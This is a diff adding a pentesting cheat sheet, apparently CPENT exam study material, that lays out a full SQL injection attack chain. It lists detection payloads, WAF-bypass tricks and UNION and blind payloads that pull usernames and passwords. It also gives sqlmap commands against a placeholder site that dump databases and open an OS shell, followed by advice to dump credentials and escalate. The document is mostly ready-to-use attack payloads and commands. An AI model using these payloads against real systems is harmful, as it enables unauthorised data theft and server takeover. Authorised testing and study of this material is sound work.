@@ -1,0 +1,150 @@
+SQL Injection Attack Chain (CPENT Playbook)
+🔎 Step 1: Initial Testing (Check Injection Points)
+
+Inject basic payloads into parameters (id=1, username=admin, search boxes, headers).
+
+Examples:
+
+' OR '1'='1
+" OR "1"="1
+) OR (1=1
+
+
+👉 If the response changes (more results, login bypass, error, blank page), SQL injection is suspected.
+
+🔍 Step 2: Identify Injection Type
+
+Use simple probes:
+
+Error-Based Test:
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+
+
+👉 If DB error appears, it’s Error-based SQLi.
+
+Boolean Test:
+
+' AND 1=1--
+' AND 1=2--
+
+
+👉 If responses differ, it’s Boolean-based Blind.
+
+Time-Based Test:
+
+' OR IF(1=1,SLEEP(5),0)--
+
+
+👉 If page delays 5s, it’s Time-based Blind.
+
+Union Test:
+
+' UNION SELECT null,null--
+
+
+👉 If error/data leaks, it’s Union-based SQLi.
+
+🛡️ Step 3: Apply WAF Bypass if Needed
+
+If queries are blocked:
+
+Use comments: UN/**/ION SEL/**/ECT
+
+Use encodings: %27 for ', %3B for ;
+
+Replace operators: OR → ||, = → LIKE
+
+Use CHAR() / ASCII() instead of 'a'
+
+Change case: UnIoN SeLeCt
+
+Replace functions: SLEEP() → BENCHMARK()
+
+📡 Step 4: Exploit & Extract Data
+✅ Error-Based SQLi
+' AND (SELECT @@version)--
+
+✅ Union-Based SQLi
+
+Find column count:
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+
+Extract data:
+
+' UNION SELECT null,username,password FROM users--
+
+✅ Boolean-Based Blind
+' OR SUBSTRING(username,1,1)='a'--
+' OR ASCII(SUBSTRING(username,1,1))=97--
+
+✅ Time-Based Blind
+' OR IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--
+
+⚡ Step 5: Automate with sqlmap
+
+Instead of manual guessing, let sqlmap do the work.
+
+Examples:
+
+Error-Based:
+
+sqlmap -u "http://site.com/page.php?id=1" -p id --technique=E --banner
+
+
+Union-Based:
+
+sqlmap -u "http://site.com/page.php?id=1" -p id --technique=U --dump
+
+
+Boolean-Based Blind:
+
+sqlmap -u "http://site.com/login.php" --data="username=admin&password=pass" -p username --technique=B --dump
+
+
+Time-Based Blind:
+
+sqlmap -u "http://site.com/login.php" --data="username=admin&password=pass" -p username --technique=T --dump
+
+
+Stacked / OS Shell:
+
+sqlmap -u "http://site.com/page.php?id=1" -p id --technique=S --os-shell
+
+🚀 Step 6: Post-Exploitation (What to Do After Getting In)
+
+Enumerate databases:
+
+sqlmap -u "http://site.com/page.php?id=1" --dbs
+
+
+Dump tables:
+
+sqlmap -u "http://site.com/page.php?id=1" -D targetdb --tables
+
+
+Dump columns:
+
+sqlmap -u "http://site.com/page.php?id=1" -D targetdb -T users --columns
+
+
+Dump data:
+
+sqlmap -u "http://site.com/page.php?id=1" -D targetdb -T users --dump
+
+📖 Quick CPENT-Style Workflow (Cheatsheet)
+
+Test: ' OR 1=1--, ORDER BY, SLEEP()
+
+Detect type: Error, Union, Boolean, Time, Stacked, OOB
+
+Bypass WAF: comments, encoding, case, CHAR(), LIKE
+
+Exploit: SUBSTRING/ASCII/SLEEP, UNION SELECT, errors
+
+Automate: sqlmap with --technique flags
+
+Extract & Pivot: dump creds, try OS shell, escalate
